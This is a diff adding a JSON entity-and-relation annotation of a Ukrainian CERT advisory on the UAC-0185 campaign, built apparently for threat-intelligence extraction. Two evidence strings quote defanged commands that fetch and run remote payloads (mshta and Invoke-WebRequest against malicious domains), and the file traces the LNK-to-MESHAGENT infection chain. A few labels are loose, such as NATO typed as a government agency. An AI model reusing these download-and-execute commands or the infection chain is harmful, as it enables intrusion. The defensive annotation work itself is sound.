@@ -1,0 +1,237 @@
+{
+  "entities": [
+    {
+      "name": "MIL.CERT-UA",
+      "kind": "government agency",
+      "gloss": "The computer emergency response team of the Ministry of Defence of Ukraine."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign state in Eastern Europe."
+    },
+    {
+      "name": "Український союз промисловців та підприємців",
+      "kind": "company",
+      "gloss": "A Ukrainian non-governmental organization and business association representing industrial and commercial enterprises."
+    },
+    {
+      "name": "НАТО",
+      "kind": "government agency",
+      "gloss": "An intergovernmental military alliance consisting of 32 member states."
+    },
+    {
+      "name": "UAC-0185",
+      "kind": "threat actor",
+      "gloss": "A threat actor group, also tracked as UNC4221, targeting Ukrainian defense entities, messaging apps, and military systems."
+    },
+    {
+      "name": "UNC4221",
+      "kind": "threat actor",
+      "gloss": "An alias for the threat actor group tracked by CERT-UA as UAC-0185."
+    },
+    {
+      "name": "Signal",
+      "kind": "software product",
+      "gloss": "A cross-platform centralized encrypted instant messaging service."
+    },
+    {
+      "name": "Telegram",
+      "kind": "software product",
+      "gloss": "A cloud-based, cross-platform instant messaging service."
+    },
+    {
+      "name": "WhatsApp",
+      "kind": "software product",
+      "gloss": "An instant messaging and voice-over-IP service owned by Meta."
+    },
+    {
+      "name": "DELTA",
+      "kind": "software product",
+      "gloss": "A Ukrainian military situational awareness and battlefield management system."
+    },
+    {
+      "name": "ТЕНЕТА",
+      "kind": "software product",
+      "gloss": "A Ukrainian military communications and information system."
+    },
+    {
+      "name": "Кропива",
+      "kind": "software product",
+      "gloss": "A Ukrainian proprietary combat tactical management system for artillery and intelligence units."
+    },
+    {
+      "name": "Сили оборони України",
+      "kind": "government agency",
+      "gloss": "The unified military defense forces of Ukraine."
+    },
+    {
+      "name": "MESHAGENT",
+      "kind": "malware",
+      "gloss": "A remote management agent software misused by threat actors for remote command and control."
+    },
+    {
+      "name": "ULTRAVNC",
+      "kind": "software product",
+      "gloss": "An open-source remote administration and screen-sharing tool."
+    },
+    {
+      "name": "mshta.exe",
+      "kind": "software product",
+      "gloss": "A legitimate Microsoft Windows utility used to execute Microsoft HTML Application files."
+    },
+    {
+      "name": "лист_02-1-437.lnk",
+      "kind": "computer file",
+      "gloss": "A malicious Windows shortcut file that initiates an infection chain by executing an HTA script."
+    },
+    {
+      "name": "start.hta",
+      "kind": "computer file",
+      "gloss": "An HTML application file containing malicious JavaScript code to launch PowerShell commands."
+    },
+    {
+      "name": "Front.png",
+      "kind": "computer file",
+      "gloss": "A malicious ZIP archive disguised as a PNG image containing dropper scripts and executables."
+    },
+    {
+      "name": "Main.bat",
+      "kind": "computer file",
+      "gloss": "A batch script that executes persistence and cleanup operations during the infection."
+    },
+    {
+      "name": "Registry.hta",
+      "kind": "computer file",
+      "gloss": "An HTA file placed in the Windows Startup folder to maintain persistence and launch payloads."
+    },
+    {
+      "name": "update.exe",
+      "kind": "computer file",
+      "gloss": "An executable payload classified as the MESHAGENT remote management program."
+    },
+    {
+      "name": "gnv.exe",
+      "kind": "computer file",
+      "gloss": "An executable component corresponding to ULTRAVNC remote access tool."
+    },
+    {
+      "name": "mititarycua@gmail[.]com",
+      "kind": "email address",
+      "gloss": "An email address used by threat actors in cyberattack operations."
+    },
+    {
+      "name": "device.redirecl[.]com",
+      "kind": "domain name",
+      "gloss": "A malicious domain used to host HTA files and shortcut payloads."
+    },
+    {
+      "name": "mail.outloolc[.]com",
+      "kind": "domain name",
+      "gloss": "A spoofed domain used to distribute malicious archives and decoy documents."
+    },
+    {
+      "name": "svc.odwebp[.]com",
+      "kind": "domain name",
+      "gloss": "A malicious domain hosting MESHAGENT command and control endpoints."
+    },
+    {
+      "name": "uspp.derzhposluhy[.]com",
+      "kind": "domain name",
+      "gloss": "A spoofed domain impersonating the Ukrainian League of Industrialists and Entrepreneurs."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0185",
+      "type": "uses",
+      "tail": "MESHAGENT",
+      "evidence": "Сил оборони України з використанням спеціалізованих програмних засобів, зокрема, MESHAGENT"
+    },
+    {
+      "head": "UAC-0185",
+      "type": "uses",
+      "tail": "ULTRAVNC",
+      "evidence": "Сил оборони України з використанням спеціалізованих програмних засобів, зокрема, MESHAGENT та ULTRAVNC"
+    },
+    {
+      "head": "UAC-0185",
+      "type": "affects",
+      "tail": "Сили оборони України",
+      "evidence": "отримання несанкціонованого віддаленого доступу до ЕОМ співробітників підприємств оборонно-промислового комплексу, а також Сил оборони України"
+    },
+    {
+      "head": "лист_02-1-437.lnk",
+      "type": "delivers",
+      "tail": "start.hta",
+      "evidence": "Відкриття LNK-файлу призведе до завантаження і запуску за допомогою штатної утиліти mshta.exe файлу \"start.hta\""
+    },
+    {
+      "head": "start.hta",
+      "type": "delivers",
+      "tail": "Front.png",
+      "evidence": "друга - завантаження файлу \"Front.png\", що є ZIP-архівом"
+    },
+    {
+      "head": "Front.png",
+      "type": "delivers",
+      "tail": "Main.bat",
+      "evidence": "ZIP-архівом, в якому знаходяться три файли: \"Main.bat\", \"Registry.hta\" та \"update.exe\""
+    },
+    {
+      "head": "Front.png",
+      "type": "delivers",
+      "tail": "Registry.hta",
+      "evidence": "ZIP-архівом, в якому знаходяться три файли: \"Main.bat\", \"Registry.hta\" та \"update.exe\""
+    },
+    {
+      "head": "Front.png",
+      "type": "delivers",
+      "tail": "update.exe",
+      "evidence": "ZIP-архівом, в якому знаходяться три файли: \"Main.bat\", \"Registry.hta\" та \"update.exe\""
+    },
+    {
+      "head": "Registry.hta",
+      "type": "delivers",
+      "tail": "update.exe",
+      "evidence": "Насамкінець \"Registry.hta\" запустить \"update.exe\""
+    },
+    {
+      "head": "update.exe",
+      "type": "part-of",
+      "tail": "MESHAGENT",
+      "evidence": "\"update.exe\", який класифіковано як програму віддаленого керування MESHAGENT"
+    },
+    {
+      "head": "device.redirecl[.]com",
+      "type": "hosts",
+      "tail": "start.hta",
+      "evidence": "mshta.exe hXXps://device.redirecl[.]com/yS558pd/start.hta"
+    },
+    {
+      "head": "mail.outloolc[.]com",
+      "type": "hosts",
+      "tail": "Front.png",
+      "evidence": "Invoke-WebRequest hXXps://mail.outloolc[.]com/yS558pd/Front.png"
+    },
+    {
+      "head": "MIL.CERT-UA",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "отримано інформацію щодо розповсюдження електронних листів"
+    },
+    {
+      "head": "Український союз промисловців та підприємців",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Українського союзу промисловців та підприємців (УСПП)"
+    },
+    {
+      "head": "Сили оборони України",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Сил оборони України"
+    }
+  ],
+  "newRelationTypes": []
+}
